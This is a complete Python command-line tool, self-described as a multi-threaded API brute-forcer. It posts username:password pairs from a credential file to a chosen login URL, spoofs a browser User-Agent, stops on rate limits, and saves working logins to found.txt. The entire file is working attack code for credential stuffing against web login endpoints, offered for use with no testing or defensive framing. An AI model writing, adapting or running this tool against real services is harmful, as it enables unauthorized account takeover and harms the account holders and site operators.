#!/usr/bin/env python3

import requests
import time
import sys
import os
import threading
import argparse
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/143.0.0.0",
}

# --- THREADING GLOBALS ---
stop_event = threading.Event()  # Signal to stop all threads
print_lock = threading.Lock()   # Prevent messy printing

def check_login(url, username, password, delay):
    """
    Worker function: Checks a single password.
    """
    if stop_event.is_set():
        return

    if delay > 0:
        time.sleep(delay)

    payload = {"username": username, "password": password}

    try:
        # Short timeout for individual threads (once server is awake)
        response = requests.post(url, json=payload, headers=HEADERS, timeout=15)

        # --- CRITICAL ERRORS ---
        if response.status_code == 404:
            with print_lock:
                if not stop_event.is_set():
                    print(f"\n[!] STOPPING: The URL path was not found (404).")
                    stop_event.set()
            return

        if response.status_code == 429:
            with print_lock:
                if not stop_event.is_set():
                    print(f"\n[!] STOPPING: Rate limited (429). Decrease threads.")
                    stop_event.set()
            return

        # --- SUCCESS ---
        if response.status_code == 200:
            with print_lock:
                print(f"\n\n[+] SUCCESS: {username}:{password}")
                with open("found.txt", "a") as f:
                    f.write(f"{url} | {username}:{password}\n")
            stop_event.set()
            return

        # --- FAILURE ---
        if not stop_event.is_set():
            with print_lock:
                sys.stdout.write(f"[-] Invalid: {username}          \r")
                sys.stdout.flush()

    except Exception:
        pass

def main():
    # --- ARGUMENT PARSER SETUP ---
    parser = argparse.ArgumentParser(
        description="Multi-threaded API Brute-Forcer with Cold-Start Handling",
        epilog="Example: python3 script.py users.txt -u https://target.com/api/login -t 10"
    )

    # Positional Argument (Required)
    parser.add_argument("file", help="Path to the credential file (user:pass)")

    # Optional Arguments
    parser.add_argument("-u", "--url", help="Target URL (will prompt if omitted)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (Default: 5)")
    parser.add_argument("-d", "--delay", type=float, default=0.0, help="Delay between requests in seconds (Default: 0.0)")

    args = parser.parse_args()

    # --- VALIDATION ---
    creds_file = args.file
    if not os.path.isfile(creds_file):
        print(f"[!] File not found: {creds_file}")
        sys.exit(1)

    # Handle URL (Use argument if provided, otherwise prompt)
    if args.url:
        url = args.url
    else:
        url = input("[?] Enter target login URL: ").strip()

    print(f"[*] Loaded file: {creds_file}")
    print(f"[*] Configuration: {args.threads} Threads | {args.delay}s Delay")
    print("---------------------------------------------------")

    # --- LOAD CREDENTIALS ---
    try:
        with open(creds_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if ":" in line]
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)

    if not lines:
        print("[!] File is empty or has no valid 'user:pass' lines.")
        sys.exit(1)

    # --- PRE-FLIGHT CHECK (Cold Start Fix) ---
    print("[*] Validating connection (Waking up server)...")
    
    test_user, test_pass = lines[0].split(":", 1)
    try:
        # Long timeout (60s) to handle Render.com sleeping servers
        test_resp = requests.post(
            url, 
            json={"username": test_user, "password": test_pass}, 
            headers=HEADERS, 
            timeout=60 
        )
        
        if test_resp.status_code == 200:
            print(f"[+] SUCCESS on first attempt: {test_user}:{test_pass}")
            sys.exit(0)
        elif test_resp.status_code in [404, 405]:
            print(f"[!] Endpoint Error: {test_resp.status_code}. Check your URL.")
            sys.exit(1)
            
    except requests.exceptions.Timeout:
        print("[!] Validation timed out (60s). Server might be down.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    print("[*] Server is awake. Starting threads...")

    # --- START THREADS ---
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for line in lines[1:]:
            if stop_event.is_set():
                break
            
            username, password = line.split(":", 1)
            executor.submit(check_login, url, username, password, args.delay)

    if not stop_event.is_set():
        print("\n\n[-] Finished: No valid credentials found.")
    else:
        print("\n[*] Scan finished.")

if __name__ == "__main__":
    main()
